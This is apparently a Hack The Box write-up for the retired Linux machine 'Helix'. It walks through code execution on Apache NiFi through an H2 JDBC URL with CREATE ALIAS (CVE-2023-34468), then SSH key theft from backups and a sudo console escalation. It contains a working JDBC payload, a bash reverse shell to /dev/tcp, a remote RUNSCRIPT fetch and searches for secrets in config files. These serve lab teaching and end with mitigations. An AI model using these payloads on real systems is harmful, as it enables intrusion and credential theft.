---
machine: Helix
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, apache-nifi, h2, ics, cve-2023-34468, opc-ua]
---

# Helix — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

An industrial workflow simulated on **Apache NiFi 1.21.0** (`flow.helix.htb:8080/nifi`). The `ExecuteSQL` processor accepts a `DBCPConnectionPool` with whatever JDBC URL you supply: point it at your own **H2** database with `CREATE ALIAS` and Java runs inside NiFi's JVM (**CVE-2023-34468**), yielding a shell as `nifi`. After that, an SSH key backup in the service's support files gets you in as `operator`, and escalation arrives through the internal OPC UA service plus the maintenance console.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
```

```text
22/tcp    ssh
80/tcp    nginx
8080/tcp  Apache NiFi 1.21.0 (vhost flow.helix.htb)
```

```bash
echo "<IP> helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
```

NiFi's UI is reachable, with an open canvas or weak install credentials.

## Foothold: H2 inside NiFi

1. Create a `DBCPConnectionPool` **Controller Service**:

```text
Database Connection URL: jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
Database Driver Class:   org.h2.Driver
```

2. Add an `ExecuteSQL` processor bound to that service and run:

```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')
```

3. Start the processor and push a flowfile.

```bash
nc -lvnp 4444
```

```text
nifi@helix:/opt/nifi/nifi-current$
```

When the INIT does not fit in the URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<IP>/init.sql'`, with the `CREATE ALIAS` and the `CALL` in the script.

## Pivot to operator

```bash
find /opt/nifi -iname "*.bak" -o -iname "*.zip" -o -iname "id_*" 2>/dev/null
cat /opt/nifi/nifi-current/conf/*.properties | grep -i "pass\|secret"
```

The support backups hold an SSH private key and the `operator` user. A protected PDF in that home points at the internal service.

## Escalation

```bash
ss -ltnp | grep -v 127.0.0.1
```

The simulator's internal **OPC UA** (4840) shows up. From the internal network a tag triggers the maintenance window; during that window the `sudo`-allowed console can run:

```bash
sudo -l
sudo /usr/local/bin/maintenance-console
```

From there, commands as root.

## Evidence (redacted)

```text
/home/operator/user.txt  -> <user_flag>
/root/root.txt           -> <root_flag>
```

## Lessons

- Any processor accepting a **JDBC URL** is a Java RCE primitive when the H2 driver is on the classpath.
- `INIT=`, `RUNSCRIPT FROM` and `CREATE ALIAS` are H2's classic triad, recycled from Spring Boot to NiFi.
- A service's configuration backups routinely carry keys and secrets in clear text.
- Mitigation: JDBC drivers on an allowlist, no `INIT` in URLs, NiFi kept off the user network, and `sudo` limited to specific audited actions.
